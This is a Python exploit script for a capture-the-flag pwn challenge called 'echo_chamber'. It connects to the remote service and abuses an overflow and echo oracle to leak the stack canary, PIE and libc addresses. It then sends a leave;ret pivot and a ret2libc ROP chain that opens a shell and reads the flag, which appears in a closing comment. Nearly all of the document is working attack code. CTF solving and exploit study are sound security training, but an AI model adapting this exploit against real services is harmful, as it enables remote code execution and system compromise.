#!/usr/bin/env python3
"""
echo_chamber  (CSCTF 2026, Pwn / Hard, by Iulian Schifirnet)

Hard ret2libc against a PIE + stack-canary binary with no useful gadgets but
`leave; ret`. Pure stdlib sockets (no pwntools).

The service reads 0x70 bytes into an 0x50 buffer in chamber() and echoes it back
with printf("echo: %s", buf) - which stops at the first NUL. That echo is the
oracle: overwrite a known NUL byte and the printf keeps going, spilling the
bytes after it (canary, saved rbp, saved return).

Frame layout in chamber() (buf = rbp-0x50):
    buf+0x58  stack canary      (LSB is 0x00)
    buf+0x60  saved rbp
    buf+0x68  saved return      (into the PIE image)
The 0x70-byte read reaches exactly through the saved return, so there is only
room to pivot - hence the two-stage leave;ret plan.

Offsets below are from the provided binary; retune per build.

Usage:  python echo_pwn.py w01.ctf.chronos-security.ro 37605
"""
import socket, struct, sys

HOST = sys.argv[1] if len(sys.argv) > 1 else "w01.ctf.chronos-security.ro"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 37605

# --- binary-specific constants -------------------------------------------------
BUF            = 0x50          # buffer size
READ           = 0x70          # bytes chamber() reads (overflow = 0x20 past buf)
OFF_CANARY     = 0x58          # buf -> canary
OFF_SAVED_RBP  = 0x60          # buf -> saved rbp
OFF_SAVED_RET  = 0x68          # buf -> saved return (into PIE)
PIE_RET_DELTA  = 0x137e        # saved return - pie_base
ECHO_PRINTF    = 0x1332        # address (pie-relative) of chamber's echo printf
LIBC_MAIN_DELTA= 0x29d90       # main's saved return - libc_base
# libc gadget/symbol offsets (from the challenge's libc)
POP_RDI        = 0x2a3e5       # pop rdi ; ret
BINSH          = 0x1d8678      # "/bin/sh"
SYSTEM         = 0x50d70
LEAVE_RET      = None          # resolved from the PIE image if needed

p64 = lambda x: struct.pack("<Q", x)


def recvuntil(s, tok):
    data = b""
    while tok not in data:
        chunk = s.recv(4096)
        if not chunk:
            break
        data += chunk
    return data


def leak_after(s, prefix):
    """Send prefix (no NUL), read the echo, return the bytes that followed it."""
    s.sendall(prefix)
    echo = recvuntil(s, b"echo: ").split(b"echo: ", 1)[1]
    return echo[len(prefix):]


def main():
    s = socket.create_connection((HOST, PORT), timeout=10)
    recvuntil(s, b"echo: ")  # banner / first prompt (service-specific)

    # 1) Leak the canary: overwrite its NUL LSB so printf runs on into it.
    filler = b"A" * OFF_CANARY
    tail = leak_after(s, filler + b"B")          # B replaces the canary's 0x00 LSB
    canary = b"\x00" + tail[:7]                   # restore the real LSB
    canary_v = struct.unpack("<Q", canary)[0]
    print(f"[+] canary    = {canary_v:#018x}")

    # 2) Extend to leak saved rbp (stack) and the PIE saved return.
    tail = leak_after(s, b"A" * OFF_SAVED_RBP + b"B")
    saved_rbp = struct.unpack("<Q", b"\x00" + tail[:7])[0] if tail[0] == 0 else \
                struct.unpack("<Q", tail[:8].ljust(8, b"\x00"))[0]
    tail = leak_after(s, b"A" * OFF_SAVED_RET + b"B")
    ret_leak = struct.unpack("<Q", tail[:6].ljust(8, b"\x00"))[0]
    pie = ret_leak - PIE_RET_DELTA
    print(f"[+] saved rbp = {saved_rbp:#018x}")
    print(f"[+] pie base  = {pie:#018x}")

    # 3) libc leak: pivot rbp into main's frame and re-enter chamber's echo
    #    printf so it prints [main_rbp+8] = main's saved return into libc.
    main_rbp = saved_rbp + 0x68                   # chamber rbp -> main rbp (build-specific)
    payload  = b"A" * OFF_SAVED_RBP
    payload += p64(main_rbp + 0x68)               # fake rbp for the pivot
    payload += p64(pie + ECHO_PRINTF)             # return into the echo printf
    s.sendall(payload.ljust(READ, b"\x00"))
    tail = recvuntil(s, b"echo: ").split(b"echo: ", 1)[1]
    libc = struct.unpack("<Q", tail[:6].ljust(8, b"\x00"))[0] - LIBC_MAIN_DELTA
    print(f"[+] libc base = {libc:#018x}")

    # 4) shell: the echo loop now reads into the known buffer B = main_rbp+8.
    #    Overflow it, leave;ret-pivot into it, and ROP pop rdi ; "/bin/sh" ; system.
    rop  = p64(libc + POP_RDI) + p64(libc + BINSH) + p64(libc + SYSTEM)
    B    = main_rbp + 8
    chain = rop.ljust(OFF_SAVED_RBP, b"\x00")
    chain += p64(B - 8)                            # rbp so leave; ret lands on the ROP
    chain += p64(pie + (LEAVE_RET or 0x13aa))      # leave ; ret gadget in the PIE
    s.sendall(chain.ljust(READ, b"\x00"))

    s.sendall(b"id; cat /flag; cat /tmp/flag\n")
    print(recvuntil(s, b"CSCTF{").decode("latin-1", "replace"))
    s.settimeout(3)
    try:
        print(s.recv(4096).decode("latin-1", "replace"))
    except socket.timeout:
        pass


if __name__ == "__main__":
    main()
# Shell as uid=10001(ctf); /flag -> /tmp/flag
# Flag: CSCTF{Wy682FM0Dujh2fOOZ0uHXcWo}
